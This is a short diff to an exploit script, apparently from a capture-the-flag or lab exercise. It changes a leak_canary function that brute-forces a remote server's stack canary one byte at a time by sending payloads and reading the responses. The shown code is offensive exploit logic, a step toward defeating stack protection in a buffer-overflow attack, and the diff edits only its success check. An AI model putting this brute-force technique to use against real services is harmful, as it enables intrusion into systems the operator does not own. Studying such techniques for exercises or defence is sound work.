@@ -60,8 +60,10 @@ define function leak_canary() {
             
             send(conn, payload)
             let response = recv(conn, 1024, timeout: 1)
+            let resp_str = str(response)
             
-            if "Error" not in str(response) {
+            # If no error in response, this byte is correct
+            if "Success" in resp_str or ("Error" in resp_str) == false {
                 # Correct byte, server didn't crash
                 canary = canary + [guess]
                 print("[+] Canary byte", byte_pos, ":", hex(guess))
